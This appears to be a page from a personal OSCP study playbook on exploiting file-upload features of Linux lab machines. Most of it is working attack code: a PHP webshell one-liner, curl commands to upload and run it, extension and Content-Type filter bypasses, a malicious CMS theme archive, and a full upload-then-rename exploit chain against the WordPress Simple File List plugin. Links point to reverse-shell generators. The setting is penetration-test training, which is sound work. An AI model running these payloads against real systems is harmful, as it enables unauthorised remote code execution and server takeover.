# Linux - File Upload

**Step 9 of 50 · Linux**

*Identify what a file upload accepts, bypass filters, and land a webshell or payload.*

## Run this

First confirm what the upload accepts — try an innocent `.txt`:

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
```bash
curl -s -b $BoxDir/cookies.txt \
  -F "file=@/tmp/test.txt" \
  http://$BoxIP/upload.php
```

If accepted, escalate to a PHP webshell:

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
```bash
# Create a minimal webshell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/cmd.php

# Upload it
curl -s -b $BoxDir/cookies.txt \
  -F "file=@/tmp/cmd.php" \
  http://$BoxIP/upload.php

# Test execution
curl -s "http://$BoxIP/uploads/cmd.php?cmd=id"
```

For CMS theme/plugin zip uploads:

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
```bash
# Put the webshell inside a directory structure matching the CMS theme format
mkdir -p /tmp/malicious
echo '<?php system($_GET["cmd"]); ?>' > /tmp/malicious/malicious.php
cd /tmp && zip -r malicious.zip malicious/

# Upload via the CMS theme installer, then access at the expected theme path
curl -s "http://$BoxIP/themes/malicious/malicious.php?cmd=id"
```

## Example output

Upload accepted:

```
File uploaded successfully: /uploads/cmd.php
```

Webshell confirmed:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## What did you get?

- [ ] `.php` is accepted and executes → **Run `curl -s 'http://$BoxIP/$UploadPath/$Filename.php?cmd=id'`, confirm `uid=`, then send the documented reverse shell and go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] `.php` is blocked by extension → **Upload the same harmless test file as `probe.php5`, `probe.phtml`, `probe.phar`, and `probe.php.jpg`, one at a time; if one is accepted, return to the upload URL and test it**
- [ ] Content-type filter blocks it → **Change the `Content-Type` header to `image/jpeg` but keep the `.php` extension**
- [ ] File uploads but does not execute → **Run `curl -i http://$BoxIP/$UploadPath/$Filename` and inspect the response; if it is downloaded as text, record that directory as non-executing**
- [ ] Zip upload is accepted (CMS plugin/theme) → **Run `unzip -l $BoxDir/payload.zip` to confirm its layout, then request `http://$BoxIP/$PluginPath/$Filename` using the CMS upload directory**
- [ ] No upload path found → **Go to Step 10 · [[Linux - Exploit Search]]**

## Notes

Find the upload directory in the page source, feroxbuster output, or the upload response. The webshell URL is the upload directory plus the filename.

For reverse shell from the webshell — send via URL-encoded `cmd` parameter or switch to a dedicated reverse shell payload. Get the shell string from RevShells.

## Gotcha

> [!warning] 💡
> Extension filters are often client-side only. Intercept the upload with Burp or replace the Content-Disposition filename after the filter runs. Many filters also only check the last extension — `file.php.jpg` passes a `.jpg` check but the server may still execute it as PHP.

> [!warning] 💡
> CMS theme uploads may need specific directory structures, `style.css` headers, or metadata files to be accepted. Read the CMS documentation or examine a legitimate theme archive first.

## WordPress Simple File List upload structure

Use this subsection when WordPress exposes the Simple File List plugin. The vulnerable plugin uses separate upload and rename endpoints, and the archive or filename must reach a PHP-interpreting directory before it becomes a shell.

> **Why:** This request fingerprints the plugin version and active page before you attempt an upload; look for the plugin readme version and Simple File List references.
```bash
curl -s "http://$BoxIP/wp-content/plugins/simple-file-list/readme.txt" | head -5
curl -s "http://$BoxIP/" | grep -i "simple-file-list"
```

> **Why:** This command creates a PHP command endpoint with a harmless `id` test; the `.png` suffix is used first because the plugin may reject a direct `.php` upload.
```bash
echo '<?php system($_GET["cmd"]); ?>' > $BoxDir/www/module.png
```

> **Why:** These fields match the plugin’s upload entry point and preserve the directory, timestamp, and token values the handler expects; `200` at the resulting URL confirms placement.
```bash
curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-engine.php" \
  -F "file=@$BoxDir/www/module.png;type=image/png" \
  -F "eeSFL_ID=1" \
  -F "eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/" \
  -F "eeSFL_Timestamp=$Timestamp" \
  -F "eeSFL_Token=$Token"
curl -s -o /dev/null -w "%{http_code}\n" "http://$BoxIP/wp-content/uploads/simple-file-list/module.png"
```

> **Why:** This request uses the plugin’s rename endpoint and required AJAX headers to change the uploaded filename to a PHP entry point; look for a successful response before testing execution.
```bash
curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-file-engine.php" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: http://$BoxIP/wp-admin/" \
  -d "eeSFL_ID=1&eeFileOld=module.png&eeListFolder=/&eeFileAction=Rename|module.php"
```

> **Why:** This request checks that the renamed file is interpreted as PHP; `uid=` confirms the web process executed the module.
```bash
curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/module.php?cmd=id"
```

## Additional routing

- [ ] The plugin version and upload endpoint are confirmed → **Use the upload, direct-GET, rename, and `id` checks in order, then go to Step 12 · [[Linux - Shell Stabilise]]**
- [ ] Upload succeeds but direct GET returns `404` → **Stop before renaming; recheck the upload directory and required plugin fields**
- [ ] Rename succeeds but PHP does not execute → **Check the directory’s PHP handler and `.htaccess`, then return to the generic upload checks above**

## External Resources

| Resource | Link |
|---|---|
| HackTricks — File Upload | https://book.hacktricks.xyz/pentesting-web/file-upload |
| PayloadsAllTheThings — File Upload | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files |
| RevShells | https://www.revshells.com |
## Seen in
- [[OSCP/BOXES/WRITE UPS/Linux/11. Sea|Sea]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Linux/9. Nukem|Nukem]] -- confirmed in the box write-up

## Related stages

- [[Linux - Service Scan]]
- [[Linux - Web Enum]]
- [[Linux - Exploit Search]]
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
